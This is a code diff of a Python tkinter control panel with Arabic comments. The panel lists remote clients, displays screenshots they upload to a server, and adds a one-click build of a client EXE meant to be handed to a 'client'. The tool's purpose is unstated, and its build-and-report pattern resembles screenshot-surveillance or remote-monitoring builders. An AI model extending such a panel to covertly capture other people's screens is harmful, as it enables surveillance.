@@ -7,15 +7,18 @@ ProjectSender Panel v4 - Railway Edition
 """
 
 import tkinter as tk
-from tkinter import ttk, messagebox
+from tkinter import ttk, messagebox, filedialog
 import requests
 import threading
 import json
 import os
+import subprocess
+import sys
 from datetime import datetime
 from PIL import Image, ImageTk
 from io import BytesIO
 import base64
+from pathlib import Path
 
 # ==================== التكوين ====================
 
@@ -100,51 +103,37 @@ class ScreenshotPanel:
             bg="#2d2d2d",
             fg="#ff0000"
         )
-        self.status_label.pack(side=tk.RIGHT, padx=10, pady=5)
+        self.status_label.pack(side=tk.LEFT, padx=20, pady=5)
         
-        # ==================== إعدادات الخادم ====================
+        # الإعدادات
+        settings_frame = tk.Frame(top_frame, bg="#2d2d2d")
+        settings_frame.pack(side=tk.RIGHT, padx=10, pady=5)
         
-        settings_frame = tk.LabelFrame(
-            self.root,
-            text="⚙️ إعدادات الخادم",
-            font=("Arial", 10, "bold"),
-            bg="#2d2d2d",
-            fg="#00ff88",
-            padx=10,
-            pady=10
-        )
-        settings_frame.pack(fill=tk.X, padx=10, pady=5)
-        
-        # Server URL
         tk.Label(settings_frame, text="Server URL:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
-        self.server_url_entry = tk.Entry(settings_frame, width=40)
-        self.server_url_entry.insert(0, Config.SERVER_URL)
+        self.server_url_entry = tk.Entry(settings_frame, width=30)
         self.server_url_entry.pack(side=tk.LEFT, padx=5)
+        self.server_url_entry.insert(0, Config.SERVER_URL)
         
-        # Admin Key
         tk.Label(settings_frame, text="Admin Key:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
-        self.admin_key_entry = tk.Entry(settings_frame, width=30, show="*")
-        self.admin_key_entry.insert(0, Config.ADMIN_API_KEY)
+        self.admin_key_entry = tk.Entry(settings_frame, width=20, show="*")
         self.admin_key_entry.pack(side=tk.LEFT, padx=5)
+        self.admin_key_entry.insert(0, Config.ADMIN_API_KEY)
         
-        # User Key
         tk.Label(settings_frame, text="User Key:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
-        self.user_key_entry = tk.Entry(settings_frame, width=30, show="*")
-        self.user_key_entry.insert(0, Config.USER_API_KEY)
+        self.user_key_entry = tk.Entry(settings_frame, width=20, show="*")
         self.user_key_entry.pack(side=tk.LEFT, padx=5)
+        self.user_key_entry.insert(0, Config.USER_API_KEY)
         
-        # Save Button
         save_btn = tk.Button(
             settings_frame,
             text="💾 Save Settings",
-            bg="#0088ff",
+            bg="#0066cc",
             fg="white",
             command=self.save_settings,
             padx=10
         )
         save_btn.pack(side=tk.LEFT, padx=5)
         
-        # Test Button
         test_btn = tk.Button(
             settings_frame,
             text="🧪 Test Connection",
@@ -155,8 +144,7 @@ class ScreenshotPanel:
         )
         test_btn.pack(side=tk.LEFT, padx=5)
         
-        # Upload to GitHub Button
-        github_btn = tk.Button(
+        upload_btn = tk.Button(
             settings_frame,
             text="📤 Upload to GitHub",
             bg="#ff6600",
@@ -164,89 +152,72 @@ class ScreenshotPanel:
             command=self.show_github_commands,
             padx=10
         )
-        github_btn.pack(side=tk.LEFT, padx=5)
+        upload_btn.pack(side=tk.LEFT, padx=5)
         
-        # ==================== المحتوى الرئيسي ====================
+        # ==================== التبويبات ====================
         
-        main_frame = tk.Frame(self.root, bg="#1e1e1e")
-        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        self.notebook = ttk.Notebook(self.root)
+        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        # ==================== Notebook (Tabs) ====================
-        
-        notebook = ttk.Notebook(main_frame)
-        notebook.pack(fill=tk.BOTH, expand=True)
-        
-        # Tab 1: Clients
-        self.clients_tab = tk.Frame(notebook, bg="#1e1e1e")
-        notebook.add(self.clients_tab, text="👥 Clients")
+        # تبويب العملاء
+        self.clients_tab = tk.Frame(self.notebook, bg="#1e1e1e")
+        self.notebook.add(self.clients_tab, text="👥 Clients")
         self.create_clients_tab()
         
-        # Tab 2: Generate EXE
-        self.exe_tab = tk.Frame(notebook, bg="#1e1e1e")
-        notebook.add(self.exe_tab, text="🔨 Generate EXE")
+        # تبويب إنشاء EXE
+        self.exe_tab = tk.Frame(self.notebook, bg="#1e1e1e")
+        self.notebook.add(self.exe_tab, text="🔨 Generate EXE")
         self.create_exe_tab()
     
     def create_clients_tab(self):
         """إنشاء تبويب العملاء"""
         
-        # ==================== قائمة العملاء ====================
+        main_frame = tk.Frame(self.clients_tab, bg="#1e1e1e")
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        clients_frame = tk.LabelFrame(
-            self.clients_tab,
-            text="👥 العملاء المتصلين",
-            font=("Arial", 10, "bold"),
+        # قائمة العملاء
+        left_frame = tk.Frame(main_frame, bg="#1e1e1e")
+        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=5)
+        
+        clients_label = tk.Label(
+            left_frame,
+            text="📋 العملاء",
+            font=("Arial", 12, "bold"),
+            bg="#1e1e1e",
+            fg="#00ff88"
+        )
+        clients_label.pack(pady=5)
+        
+        # Listbox للعملاء
+        self.clients_listbox = tk.Listbox(
+            left_frame,
             bg="#2d2d2d",
             fg="#00ff88",
-            padx=10,
-            pady=10
-        )
-        clients_frame.pack(side=tk.LEFT, fill=tk.BOTH, padx=5, pady=5)
-        
-        # Listbox
-        self.clients_listbox = tk.Listbox(
-            clients_frame,
             width=25,
-            height=20,
-            bg="#1e1e1e",
-            fg="#00ff88",
-            font=("Arial", 9)
+            height=20
         )
         self.clients_listbox.pack(fill=tk.BOTH, expand=True)
         self.clients_listbox.bind("<<ListboxSelect>>", self.on_client_select)
         
-        # Refresh Button
-        refresh_btn = tk.Button(
-            clients_frame,
-            text="🔄 Refresh",
-            bg="#0088ff",
-            fg="white",
-            command=self.refresh_clients
-        )
-        refresh_btn.pack(fill=tk.X, pady=5)
-        
-        # ==================== معلومات العميل والتحكم ====================
-        
-        right_frame = tk.Frame(self.clients_tab, bg="#1e1e1e")
+        # معلومات العميل
+        right_frame = tk.Frame(main_frame, bg="#1e1e1e")
         right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
         
-        # معلومات العميل
-        info_frame = tk.LabelFrame(
+        info_label = tk.Label(
             right_frame,
-            text="📋 معلومات العميل",
-            font=("Arial", 10, "bold"),
-            bg="#2d2d2d",
-            fg="#00ff88",
-            padx=10,
-            pady=10
+            text="📊 معلومات العميل",
+            font=("Arial", 12, "bold"),
+            bg="#1e1e1e",
+            fg="#00ff88"
         )
-        info_frame.pack(fill=tk.X, pady=5)
+        info_label.pack(pady=5)
         
         self.info_text = tk.Text(
-            info_frame,
-            height=6,
-            bg="#1e1e1e",
+            right_frame,
+            bg="#2d2d2d",
             fg="#00ff88",
-            font=("Courier", 9)
+            height=10,
+            width=50
         )
         self.info_text.pack(fill=tk.BOTH, expand=True)
         
@@ -358,6 +329,19 @@ class ScreenshotPanel:
         )
         generate_btn.pack(side=tk.LEFT, padx=5)
         
+        # زر Generate & Save EXE Auto
+        auto_build_btn = tk.Button(
+            buttons_frame,
+            text="⚡ Generate & Save EXE Auto",
+            bg="#ff6600",
+            fg="white",
+            font=("Arial", 12, "bold"),
+            command=self.generate_and_save_exe_auto,
+            padx=20,
+            pady=10
+        )
+        auto_build_btn.pack(side=tk.LEFT, padx=5)
+        
         # حالة الإنشاء
         self.exe_status_label = tk.Label(
             main_frame,
@@ -406,55 +390,44 @@ class ScreenshotPanel:
             
             if response.status_code == 200:
                 self.clients = response.json().get("clients", {})
-                self.update_clients_list()
-                self.status_label.config(text="🟢 متصل", fg="#00ff00")
-        except Exception as e:
-            self.status_label.config(text="🔴 غير متصل", fg="#ff0000")
-    
-    def update_clients_list(self):
-        """تحديث قائمة العملاء في الـ Listbox"""
-        self.clients_listbox.delete(0, tk.END)
-        for client_id, client_data in self.clients.items():
-            status = "🟢" if client_data.get("status") == "online" else "🔴"
-            text = f"{status} {client_data.get('computer', 'Unknown')}"
-            self.clients_listbox.insert(tk.END, text)
+                self.clients_listbox.delete(0, tk.END)
+                
+                for client_id, client_info in self.clients.items():
+                    status = "🟢" if client_info.get("status") == "online" else "🔴"
+                    display_name = client_info.get("display_name", "N/A")
+                    self.clients_listbox.insert(tk.END, f"{status} {display_name} ({client_id[:8]})")
+        except:
+            pass
     
     def on_client_select(self, event):
         """عند اختيار عميل"""
         selection = self.clients_listbox.curselection()
-        if selection:
-            index = selection[0]
-            client_ids = list(self.clients.keys())
-            self.selected_client = client_ids[index]
-            self.update_client_info()
-    
-    def update_client_info(self):
-        """تحديث معلومات العميل"""
-        if not self.selected_client:
+        if not selection:
             return
         
-        client_data = self.clients.get(self.selected_client, {})
+        index = selection[0]
+        client_ids = list(self.clients.keys())
         
-        # استخراج أول مسار من URL
-        display_name = self.extract_display_name(client_data.get('target_url', 'N/A'))
-        
-        info_text = f"""
+        if index < len(client_ids):
+            self.selected_client = client_ids[index]
+            client_info = self.clients[self.selected_client]
+            
+            info_text = f"""
 Client ID: {self.selected_client}
-Computer: {client_data.get('computer', 'Unknown')}
-Status: {client_data.get('status', 'Unknown')}
-Task: {client_data.get('task', 'Unknown')}
-Display Name: {display_name}
-Photo Count: {client_data.get('photo_count', 0)}
-Delay: {client_data.get('delay', 0)}s
-Screenshots: {client_data.get('screenshots_count', 0)}
-Last Seen: {client_data.get('last_seen', 'N/A')}
-        """
-        
-        self.info_text.delete(1.0, tk.END)
-        self.info_text.insert(1.0, info_text)
-        
-        # تحميل الصور
-        self.load_screenshots()
+Computer: {client_info.get('computer', 'N/A')}
+Status: {client_info.get('status', 'N/A')}
+Display Name: {client_info.get('display_name', 'N/A')}
+Photo Count: {client_info.get('photo_count', 0)}
+Delay: {client_info.get('delay', 'N/A')}s
+Screenshots: {len(client_info.get('screenshots', []))}
+Last Seen: {client_info.get('last_seen', 'N/A')}
+            """
+            
+            self.info_text.delete(1.0, tk.END)
+            self.info_text.insert(1.0, info_text)
+            
+            # تحميل الصور
+            self.load_screenshots()
     
     def extract_display_name(self, url):
         """استخراج أول مسار من URL"""
@@ -579,6 +552,120 @@ Last Seen: {client_data.get('last_seen', 'N/A')}
         except Exception as e:
             messagebox.showerror("Error", f"Error: {str(e)}")
     
+    def generate_and_save_exe_auto(self):
+        """إنشاء وحفظ EXE تلقائياً"""
+        try:
+            # جمع البيانات من الحقول
+            pages = []
+            for entry in self.pages_entries:
+                name = entry["name_entry"].get().strip()
+                count = entry["count_var"].get()
+                
+                if name:
+                    pages.append({
+                        "name": name,
+                        "photo_count": int(count)
+                    })
+            
+            if not pages:
+                messagebox.showerror("Error", "Please enter at least one page!")
+                return
+            
+            # الخطوة 1: إنشاء EXE ID
+            self.exe_status_label.config(
+                text="⏳ Creating EXE configuration...",
+                fg="#ffff00"
+            )
+            self.root.update()
+            
+            headers = {"X-API-Key": Config.ADMIN_API_KEY}
+            data = {
+                "pages": pages,
+                "exe_name": "ProjectSender_Client"
+            }
+            
+            response = requests.post(
+                f"{Config.SERVER_URL}/api/generate_exe",
+                json=data,
+                headers=headers,
+                timeout=10
+            )
+            
+            if response.status_code != 200:
+                messagebox.showerror("Error", f"Failed to create EXE: {response.text}")
+                return
+            
+            result = response.json()
+            exe_id = result.get("exe_id")
+            
+            # الخطوة 2: اختيار مكان الحفظ
+            self.exe_status_label.config(
+                text="⏳ Selecting save location...",
+                fg="#ffff00"
+            )
+            self.root.update()
+            
+            file_path = filedialog.asksaveasfilename(
+                defaultextension=".exe",
+                filetypes=[("Executable files", "*.exe"), ("All files", "*.*")],
+                initialfile=f"ProjectSender_Client_{exe_id[:8]}.exe"
+            )
+            
+            if not file_path:
+                messagebox.showwarning("Cancelled", "Save cancelled!")
+                return
+            
+            # الخطوة 3: بناء EXE
+            self.exe_status_label.config(
+                text="⏳ Building EXE... This may take a minute...",
+                fg="#ffff00"
+            )
+            self.root.update()
+            
+            # استدعاء build_exe_from_config.py
+            try:
+                # البحث عن build_exe_from_config.py
+                script_path = Path(__file__).parent / "build_exe_from_config.py"
+                if not script_path.exists():
+                    script_path = Path("build_exe_from_config.py")
+                
+                if not script_path.exists():
+                    messagebox.showerror("Error", "build_exe_from_config.py not found!")
+                    return
+                
+                # تشغيل البناء
+                result = subprocess.run(
+                    [sys.executable, str(script_path), exe_id, file_path],
+                    capture_output=True,
+                    text=True,
+                    timeout=300
+                )
+                
+                if result.returncode != 0:
+                    messagebox.showerror("Build Error", f"Build failed:\n{result.stderr}")
+                    return
+                
+                # النجاح
+                self.exe_status_label.config(
+                    text=f"✅ EXE Saved! ID: {exe_id}",
+                    fg="#00ff00"
+                )
+                
+                messagebox.showinfo(
+                    "Success",
+                    f"EXE created and saved successfully!\n\n"
+                    f"File: {file_path}\n\n"
+                    f"EXE ID: {exe_id}\n\n"
+                    f"You can now give this EXE to your client."
+                )
+            except subprocess.TimeoutExpired:
+                messagebox.showerror("Error", "Build process timed out!")
+            except Exception as e:
+                messagebox.showerror("Error", f"Build error: {str(e)}")
+        
+        except Exception as e:
+            messagebox.showerror("Error", f"Error: {str(e)}")
+    
     def start_auto_refresh(self):
         """بدء التحديث التلقائي"""
         def refresh_loop():
@@ -601,31 +688,24 @@ cd /path/to/your/repo
 
 ## الخطوة 2: نسخ الملفات الجديدة
 ```bash
-cp /path/to/ProjectSender_v6_Clean/main_backend_v3.py .
-cp /path/to/ProjectSender_v6_Clean/panel_v4_railway.py .
-cp /path/to/ProjectSender_v6_Clean/screenshot_client_v2_gui.py .
-cp /path/to/ProjectSender_v6_Clean/build_exe_from_config.py .
-cp /path/to/ProjectSender_v6_Clean/README.md .
+cp main_backend_v3.py .
+cp panel_v4_railway.py .
+cp screenshot_client_v2_gui.py .
+cp build_exe_from_config.py .
+cp screenshot_client_auto.py .
+cp requirements.txt .
+cp railway.json .
+cp Dockerfile .
 ```
 
 ## الخطوة 3: إضافة الملفات
 ```bash
-git add main_backend_v3.py
-git add panel_v4_railway.py
-git add screenshot_client_v2_gui.py
-git add build_exe_from_config.py
-git add README.md
+git add .
 ```
 
 ## الخطوة 4: Commit
 ```bash
-git commit -m "Update: Add v6 features - Generate EXE functionality
-
-- Add main_backend_v3.py with new API endpoints
-- Add panel_v4_railway.py with Generate EXE tab
-- Add screenshot_client_v2_gui.py with page selection
-- Add build_exe_from_config.py for EXE generation
-- Update README.md with v6 documentation"
+git commit -m "Update: Add v6 features - Generate EXE functionality"
 ```
 
 ## الخطوة 5: Push
@@ -643,144 +723,113 @@ git rm build_exe_complete.py
 git commit -m "Remove: Delete old v5 files"
 git push origin main
 ```
-
-✅ بعد الانتهاء:
-- Railway سيعيد التشغيل تلقائياً
-- انتظر 2-3 دقائق
-- تحقق من الحالة: "Deployment successful"
 """
         
-        # عرض نافذة بها الأوامر
-        top = tk.Toplevel(self.root)
-        top.title("📤 Upload to GitHub - Commands")
-        top.geometry("900x700")
-        top.configure(bg="#1e1e1e")
+        # إنشاء نافذة جديدة
+        commands_window = tk.Toplevel(self.root)
+        commands_window.title("GitHub Upload Commands")
+        commands_window.geometry("600x500")
+        commands_window.configure(bg="#1e1e1e")
         
         # عنوان
-        title_label = tk.Label(
-            top,
+        title = tk.Label(
+            commands_window,
             text="📤 أوامر رفع الملفات إلى GitHub",
-            font=("Arial", 14, "bold"),
+            font=("Arial", 12, "bold"),
             bg="#1e1e1e",
             fg="#00ff88"
         )
-        title_label.pack(pady=10)
+        title.pack(pady=10)
         
         # نص الأوامر
-        text_frame = tk.Frame(top, bg="#1e1e1e")
-        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        scrollbar = tk.Scrollbar(text_frame)
-        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
-        
         text_widget = tk.Text(
-            text_frame,
+            commands_window,
             bg="#2d2d2d",
             fg="#00ff88",
-            font=("Courier", 9),
-            yscrollcommand=scrollbar.set,
-            wrap=tk.WORD
+            font=("Courier", 10),
+            height=20,
+            width=70
         )
-        text_widget.pack(fill=tk.BOTH, expand=True)
-        scrollbar.config(command=text_widget.yview)
-        
-        text_widget.insert(tk.END, commands)
+        text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        text_widget.insert(1.0, commands)
         text_widget.config(state=tk.DISABLED)
         
-        # زر نسخ
-        # Frame للأزرار
-        btn_frame = tk.Frame(top, bg="#1e1e1e")
-        btn_frame.pack(pady=10)
+        # أزرار
+        buttons_frame = tk.Frame(commands_window, bg="#1e1e1e")
+        buttons_frame.pack(fill=tk.X, padx=10, pady=10)
         
-        # زر Copy
         copy_btn = tk.Button(
-            btn_frame,
+            buttons_frame,
             text="📋 Copy All Commands",
-            bg="#0088ff",
+            bg="#0066cc",
             fg="white",
-            command=lambda: self.copy_to_clipboard(commands),
-            padx=10,
-            pady=5
+            command=lambda: self.copy_to_clipboard(commands)
         )
         copy_btn.pack(side=tk.LEFT, padx=5)
         
-        # زر Download ZIP
         download_btn = tk.Button(
-            btn_frame,
+            buttons_frame,
             text="📥 Download ZIP",
-            bg="#00aa00",
+            bg="#ff6600",
             fg="white",
-            command=self.download_zip,
-            padx=10,
-            pady=5
+            command=self.download_zip
         )
         download_btn.pack(side=tk.LEFT, padx=5)
-    
-    def download_zip(self):
-        """تحميل ملف ZIP"""
-        try:
-            from tkinter import filedialog
-            import shutil
-            import os
-            
-            # اختيار مكان الحفظ
-            save_path = filedialog.asksaveasfilename(
-                defaultextension=".zip",
-                filetypes=[("ZIP files", "*.zip"), ("All files", "*.*")],
-                initialfile="ProjectSender_v6_Clean.zip"
-            )
-            
-            if not save_path:
-                return
-            
-            # مسار الملف الموجود
-            # البحث عن الملف في عدة أماكن
-            possible_paths = [
-                os.path.join(os.path.dirname(__file__), "ProjectSender_v6_Clean.zip"),
-                os.path.join(os.path.dirname(__file__), "../ProjectSender_v6_Clean.zip"),
-                os.path.join(os.path.dirname(__file__), "../../ProjectSender_v6_Clean.zip"),
-                os.path.expanduser("~/ProjectSender_v6_Clean.zip"),
-                os.path.expanduser("~/Downloads/ProjectSender_v6_Clean.zip"),
-            ]
-            
-            source_zip = None
-            for path in possible_paths:
-                if os.path.exists(path):
-                    source_zip = path
-                    break
-            
-            # إذا لم يوجد الملف، نرسل رسالة خطأ
-            if not source_zip:
-                messagebox.showerror(
-                    "Error",
-                    "ZIP file not found!\n\n"
-                    "Please make sure ProjectSender_v6_Clean.zip is in one of these locations:\n"
-                    f"- {possible_paths[0]}\n"
-                    f"- {possible_paths[1]}\n"
-                    f"- {possible_paths[4]}"
-                )
-                return
-            
-            # نسخ الملف
-            shutil.copy(source_zip, save_path)
-            
-            messagebox.showinfo(
-                "✅ Success",
-                f"ZIP file downloaded successfully!\n\n"
-                f"Location: {save_path}\n\n"
-                f"Next steps:\n"
-                f"1. Extract the ZIP file\n"
-                f"2. Copy files to your GitHub repo\n"
-                f"3. Run the git commands above"
-            )
-        except Exception as e:
-            messagebox.showerror("Error", f"Failed to download ZIP: {str(e)}")
+        
+        close_btn = tk.Button(
+            buttons_frame,
+            text="✖ Close",
+            bg="#cc0000",
+            fg="white",
+            command=commands_window.destroy
+        )
+        close_btn.pack(side=tk.RIGHT, padx=5)
     
     def copy_to_clipboard(self, text):
         """نسخ النص إلى الحافظة"""
         self.root.clipboard_clear()
         self.root.clipboard_append(text)
-        messagebox.showinfo("✅ Success", "Commands copied to clipboard!")
+        messagebox.showinfo("Success", "Commands copied to clipboard!")
+    
+    def download_zip(self):
+        """تحميل ملف ZIP"""
+        try:
+            file_path = filedialog.asksaveasfilename(
+                defaultextension=".zip",
+                filetypes=[("ZIP files", "*.zip"), ("All files", "*.*")],
+                initialfile="ProjectSender_v6_Clean.zip"
+            )
+            
+            if not file_path:
+                return
+            
+            # البحث عن ملف ZIP
+            source_zip = None
+            
+            # البحث في الأماكن المختلفة
+            possible_paths = [
+                Path(__file__).parent / "ProjectSender_v6_Clean.zip",
+                Path("ProjectSender_v6_Clean.zip"),
+                Path.home() / "ProjectSender_v6_Clean.zip",
+                Path.home() / "Downloads" / "ProjectSender_v6_Clean.zip",
+            ]
+            
+            for path in possible_paths:
+                if path.exists():
+                    source_zip = path
+                    break
+            
+            if not source_zip:
+                messagebox.showerror("Error", "ZIP file not found!")
+                return
+            
+            # نسخ الملف
+            import shutil
+            shutil.copy(str(source_zip), file_path)
+            
+            messagebox.showinfo("Success", f"ZIP file saved to:\n{file_path}")
+        except Exception as e:
+            messagebox.showerror("Error", f"Error: {str(e)}")
     
     def on_closing(self):
         """عند إغلاق النافذة"""
